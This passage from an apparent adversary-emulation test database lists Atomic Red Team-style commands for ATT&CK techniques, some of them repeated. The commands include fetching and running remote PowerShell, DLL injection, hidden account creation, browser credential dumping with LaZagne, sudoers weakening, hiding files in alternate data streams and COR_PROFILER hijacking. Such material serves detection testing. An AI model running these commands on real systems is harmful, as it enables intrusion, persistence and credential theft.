"modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\extracted.exe\\" -ErrorAction Ignore\\n", "command": ["$macro = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\")\\n$macro = $macro -replace \\"aREPLACEMEa\\"", " \\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\"\\nIEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\"$macro\\" -officeProduct \\"Word\\" -sub \\"Extract\\" -NoWrap\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract binary files via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "net user $ /DELETE 2>&1", "command": ["net user $ ATOMIC123! /add /active:yes"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a user called \\"$\\" as noted here", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"Administrator \\" 2>&1 | out-null", "command": ["New-LocalUser -Name \\"Administrator \\" -NoPassword"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create an \\"Administrator \\" user (with a space on the end)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "mavinject - Inject DLL into running process", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_id", "value": "1000"}, {"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\x64\\\\T1218.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["SyncAppvPublishingServer.exe \\"n; #{powershell_code}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_code", "value": "Start-Process calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Register-CimProvider - Execute evil dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Win32\\\\T1218-2.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["InfDefaultInstall.exe #{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InfDefaultInstall.exe .inf Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Infdefaultinstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["FOR /F \\"tokens=2*\\" %a in ('reg query \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\Winword.exe\\" /V PATH') do set microsoft_wordpath=%b\\ncall \\"%microsoft_wordpath%\\\\protocolhandler.exe\\" \\"ms-word:nft|u|#{remote_url}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ProtocolHandler.exe Downloaded a Suspicious File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"(Resolve-Path \\"C:\\\\Program Files*\\\\Microsoft Office\\\\root\\\\Office16\\")\\\\protocolhandler.exe\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "remote_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{mwcpath}\\\\#{mwcname} \\"#{xml_payload}\\" output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Microsoft.Workflow.Compiler.exe Payload Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{mwcpath}\\\\#{mwcname} ) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{renamed_binary} #{xml_payload} output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Copy-Item #{mwcpath}\\\\#{mwcname} \\"#{renamed_binary}\\" -Force\\nif (Test-Path \\"#{renamed_binary}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "renamed_binary", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\svchost.exe"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "module_name", "value": "foo"}, {"key": "module_path", "value": "$PWD"}], "execution_status": "Pass"}]}}}}
292	\N		\N	yes	P2	\N	2021-07-29 05:25:20.745318+00	T1548.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "test", "command": ["test"], "executor": ["Psh"], "platform": "", "file_name": "", "pre_command": [], "ability_name": "", "created_date": "29/07/2021", "post_command": [], "modified_date": "29/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}], "atomicred": [{"cleanup": "NA", "command": ["sudo -l      \\nsudo cat /etc/sudoers\\nsudo vim /etc/sudoers\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Sudo usage", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["sudo sed -i 's/env_reset.*$/env_reset", "timestamp_timeout=-1/' /etc/sudoers\\nsudo visudo -c -f /etc/sudoers\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Unlimited sudo cache timeout", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["sudo sh -c \\"echo Defaults \\"'!'\\"tty_tickets >> /etc/sudoers\\"\\nsudo visudo -c -f /etc/sudoers\\n"], "executor": "sh", "platform": "linux", "file_name": "", "pre_command": [], "ability_name": "Disable tty_tickets for sudo caching", "created_date": "29/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}]}}}}
310	\N		\N	yes	P2	\N	2021-07-30 02:31:50.619134+00	T1218.002	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["cd ~/Library/Cookies\\ngrep -q \\"#{search_string}\\" \\"Cookies.binarycookies\\"\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Search macOS Safari Cookies", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "search_string", "value": "coinbase"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item #{file_path}\\\\Sysinternals -Force -Recurse -ErrorAction Ignore", "command": ["#{lazagne_path} browsers\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "LaZagne - Credentials from Browser", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{lazagne_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "lazagne_path", "value": "PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["security -h\\nsecurity find-certificate -a -p > #{cert_export}\\nsecurity import #{cert_export} -k\\n"], "executor": "sh", "platform": "macos", "file_name": "", "pre_command": [], "ability_name": "Keychain", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "cert_export", "value": "/tmp/certs.pem"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Start-Process #{powershell_command}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Hidden Window", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_command", "value": "powershell.exe -WindowStyle hidden calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["type C:\\\\temp\\\\evil.exe > \\"C:\\\\Program Files (x86)\\\\TeamViewer\\\\TeamViewer12_Logfile.log:evil.exe\\"\\nextrac32 #{path}\\\\procexp.cab #{path}\\\\file.txt:procexp.exe\\nfindstr /V /L W3AllLov3DonaldTrump #{path}\\\\procexp.exe > #{path}\\\\file.txt:procexp.exe\\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\\\temp:ttt\\nmakecab #{path}\\\\autoruns.exe #{path}\\\\cabtest.txt:autoruns.cab\\nprint /D:#{path}\\\\file.txt:autoruns.exe #{path}\\\\Autoruns.exe\\nreg export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg #{path}\\\\file.txt:evilreg.reg\\nregedit /E #{path}\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\\\MyCustomRegKey\\nexpand \\\\\\\\webdav\\\\folder\\\\file.bat #{path}\\\\file.txt:file.bat\\nesentutl.exe /y #{path}\\\\autoruns.exe /d #{path}\\\\file.txt:autoruns.exe /o \\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Alternate Data Streams (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "path", "value": "c:\\\\ADS\\\\"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"#{ads_file_path}\\" -Force -ErrorAction Ignore\\n", "command": ["if (!(Test-Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki -PathType Container)) {\\n    New-Item -ItemType Directory -Force -Path C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\n    }\\nStart-Process -FilePath \\"$env:comspec\\" -ArgumentList \\"/c", "type", "#{payload_path}", ">", "`\\"#{ads_file_path}:#{ads_name}`\\"\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Store file in Alternate Data Stream (ADS)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "payload_path", "value": "c:\\\\windows\\\\system32\\\\cmd.exe"}, {"key": "ads_file_path", "value": "C:\\\\Users\\\\Public\\\\Libraries\\\\yanki\\\\desktop.ini"}, {"key": "ads_name", "value": "desktop.ini"}], "execution_status": "Pass"}, {"cleanup": "del #{file_name} >nul 2>&1\\n", "command": ["echo cmd /c echo \\"Shell code execution.\\"> #{file_name}:#{ads_filename}\\nfor /f \\"usebackq delims=?\\" %i in (#{file_name}:#{ads_filename}) do %i\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS command prompt", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_name", "value": "%temp%\\\\T1564.004_has_ads_cmd.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path #{file_name} -ErrorAction Ignore\\n", "command": ["echo \\"test\\" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value \\"test\\"\\nset-content -path #{file_name} -stream #{ads_filename} -value \\"test2\\"\\nset-content -path . -stream #{ads_filename} -value \\"test3\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create ADS PowerShell", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\extracted.exe\\" -ErrorAction Ignore\\n", "command": ["$macro = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\")\\n$macro = $macro -replace \\"aREPLACEMEa\\"", " \\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\"\\nIEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\"$macro\\" -officeProduct \\"Word\\" -sub \\"Extract\\" -NoWrap\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract binary files via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "net user $ /DELETE 2>&1", "command": ["net user $ ATOMIC123! /add /active:yes"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a user called \\"$\\" as noted here", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"Administrator \\" 2>&1 | out-null", "command": ["New-LocalUser -Name \\"Administrator \\" -NoPassword"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create an \\"Administrator \\" user (with a space on the end)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "mavinject - Inject DLL into running process", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_id", "value": "1000"}, {"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\x64\\\\T1218.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["SyncAppvPublishingServer.exe \\"n; #{powershell_code}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_code", "value": "Start-Process calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Register-CimProvider - Execute evil dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Win32\\\\T1218-2.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["InfDefaultInstall.exe #{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InfDefaultInstall.exe .inf Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Infdefaultinstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["FOR /F \\"tokens=2*\\" %a in ('reg query \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\Winword.exe\\" /V PATH') do set microsoft_wordpath=%b\\ncall \\"%microsoft_wordpath%\\\\protocolhandler.exe\\" \\"ms-word:nft|u|#{remote_url}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ProtocolHandler.exe Downloaded a Suspicious File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"(Resolve-Path \\"C:\\\\Program Files*\\\\Microsoft Office\\\\root\\\\Office16\\")\\\\protocolhandler.exe\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "remote_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{mwcpath}\\\\#{mwcname} \\"#{xml_payload}\\" output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Microsoft.Workflow.Compiler.exe Payload Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{mwcpath}\\\\#{mwcname} ) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{renamed_binary} #{xml_payload} output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Copy-Item #{mwcpath}\\\\#{mwcname} \\"#{renamed_binary}\\" -Force\\nif (Test-Path \\"#{renamed_binary}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "renamed_binary", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\svchost.exe"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "module_name", "value": "foo"}, {"key": "module_path", "value": "$PWD"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["control.exe #{cpl_file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Control Panel Items", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "cpl_file_path", "value": "PathToAtomicsFolder\\\\T1218.002\\\\bin\\\\calc.cpl"}], "execution_status": "Pass"}]}}}}
45	\N		reg	yes	P2	\N	2021-07-30 03:17:45.448238+00	T1574.012	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "", "command": ["Windows Registry Editor Version 5.00\\n\\n[HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment]\\n\\"COR_ENABLE_PROFILING\\"=\\"1\\"\\n\\"COR_PROFILER_PATH\\"=\\"C:\\\\\\\\Users\\\\\\\\Doccuments\\"\\n"], "executor": [""], "platform": "", "file_name": "T1574_012.reg", "platforms": "", "pre_command": [], "ability_name": "", "created_date": "", "post_command": [], "modified_date": "2021-06-17T09:22:50.585Z", "pre-requisite": [], "pre-requistes": null, "input_arguments": [{"key": "", "value": ""}], "execution_status": "Pass"}], "atomicred": [{"cleanup": "Remove-Item -Path \\"HKCU:\\\\Software\\\\Classes\\\\CLSID\\\\#{clsid_guid}\\" -Recurse -Force -ErrorAction Ignore \\nRemove-ItemProperty -Path HKCU:\\\\Environment -Name \\"COR_ENABLE_PROFILING\\" -Force -ErrorAction Ignore | Out-Null\\nRemove-ItemProperty -Path HKCU:\\\\Environment -Name \\"COR_PROFILER\\" -Force -ErrorAction Ignore | Out-Null\\nRemove-ItemProperty -Path HKCU:\\\\Environment -Name \\"COR_PROFILER_PATH\\" -Force -ErrorAction Ignore | Out-Null\\n", "command": ["Write-Host \\"Creating registry keys in HKCU:Software\\\\Classes\\\\CLSID\\\\#{clsid_guid}\\" -ForegroundColor Cyan\\nNew-Item -Path \\"HKCU:\\\\Software\\\\Classes\\\\CLSID\\\\#{clsid_guid}\\\\InprocServer32\\" -Value #{file_name} -Force | Out-Null\\nNew-ItemProperty -Path HKCU:\\\\Environment -Name \\"COR_ENABLE_PROFILING\\" -PropertyType String -Value \\"1\\" -Force | Out-Null\\nNew-ItemProperty -Path HKCU:\\\\Environment -Name \\"COR_PROFILER\\" -PropertyType String -Value \\"#{clsid_guid}\\" -Force | Out-Null\\nNew-ItemProperty -Path HKCU:\\\\Environment -Name \\"COR_PROFILER_PATH\\" -PropertyType String -Value #{file_name} -Force | Out-Null\\nWrite-Host \\"executing eventvwr.msc\\" -ForegroundColor Cyan\\nSTART MMC.EXE EVENTVWR.MSC\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "User scope COR_PROFILER", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_name}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_name", "value": "PathToAtomicsFolder\\\\T1574.012\\\\bin\\\\T1574.012x64.dll"}, {"key": "clsid_guid", "value": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}], "execution_status": "Pass"}, {"cleanup": "Remove-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment' -Name \\"COR_ENABLE_PROFILING\\" -Force -ErrorAction Ignore | Out-Null\\nRemove-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment' -Name \\"COR_PROFILER\\" -Force -ErrorAction Ignore | Out-Null\\nRemove-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment' -Name \\"COR_PROFILER_PATH\\" -Force -ErrorAction Ignore | Out-Null\\n", "command": ["Write-Host \\"Creating system environment variables\\" -ForegroundColor Cyan\\nNew-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment' -Name \\"COR_ENABLE_PROFILING\\" -PropertyType String -Value \\"1\\" -Force | Out-Null\\nNew-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment' -Name \\"COR_PROFILER\\" -PropertyType String -Value \\"#{clsid_guid}\\" -Force | Out-Null\\nNew-ItemProperty -Path 'HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Session Manager\\\\Environment' -Name \\"COR_PROFILER_PATH\\" -PropertyType String -Value #{file_name} -Force | Out-Null\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "System Scope COR_PROFILER", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_name}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_name", "value": "PathToAtomicsFolder\\\\T1574.012\\\\bin\\\\T1574.012x64.dll"}, {"key": "clsid_guid", "value": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}], "execution_status": "Pass"}, {"cleanup": "$env:COR_ENABLE_PROFILING = 0\\n$env:COR_PROFILER = ''\\n$env:COR_PROFILER_PATH = ''\\n", "command": ["$env:COR_ENABLE_PROFILING = 1\\n$env:COR_PROFILER = '#{clsid_guid}'\\n$env:COR_PROFILER_PATH = '#{file_name}'\\nPOWERSHELL -c 'Start-Sleep 1'\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Registry-free process scope COR_PROFILER", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["if (Test-Path #{file_name}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "file_name", "value": "PathToAtomicsFolder\\\\T1574.012\\\\bin\\\\T1574.012x64.dll"}, {"key": "clsid_guid", "value": "{09108e71-974c-4010-89cb-acf471ae9e2c}"}], "execution_status": "Pass"}]}}}}
325	\N		\N	yes	P2	\N	2021-08-03 11:58:24.192793+00	T1059.003	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"atomicred": [{"cleanup": "Remove-Item #{script_path} -Force -ErrorAction Ignore\\n", "command": ["Start-Process #{script_path}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create and Execute Batch Script", "created_date": "03/08/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{script_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "command_to_execute", "value": "dir"}, {"key": "script_path", "value": "$env:TEMP\\\\T1059.003_script.bat"}], "execution_status": "Pass"}, {"cleanup": "del \\"#{file_contents_path}\\"\\n", "command": ["echo \\"#{message}\\" > \\"#{file_contents_path}\\" & type \\"#{file_contents_path}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Writes text to a file and displays it.", "created_date": "03/08/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "file_contents_path", "value": "%TEMP%\\\\test.bin"}, {"key": "message", "value": "Hello from the Windows Command Prompt!"}], "execution_status": "Pass"}]}}}}
284	\N		\N	yes	P1	\N	2021-08-19 10:18:44.404892+00	T1222.001	{"extensions": {"x-acds-attack-ext": {"x-tool-names": {"manual": [{"cleanup": "del sample.txt", "command": ["$NewAcl = Get-Acl -Path \\"C:\\\\Users\\\\Administrator\\\\Documents\\\\New folder\\\\sample.txt\\"\\n# Set properties\\n$identity = \\"BUILTIN\\\\Administrators\\"\\n$fileSystemRights = \\"FullControl\\"\\n$type = \\"Allow\\"\\n# Create new rule\\n$fileSystemAccessRuleArgumentList = $identity", " $fileSystemRights", " $type\\n$fileSystemAccessRule = New-Object -TypeName System.Security.AccessControl.FileSystemAccessRule -ArgumentList $fileSystemAccessRuleArgumentList\\n# Apply new rule\\n$NewAcl.SetAccessRule($fileSystemAccessRule)\\nSet-Acl -Path \\"C:\\\\Users\\\\Administrator\\\\Documents\\\\New folder\\\\sample.txt\\" -AclObject $NewAcl"], "executor": ["pwsh"], "platform": "Windows", "file_name": "sample.txt", "pre_command": [], "ability_name": "", "created_date": 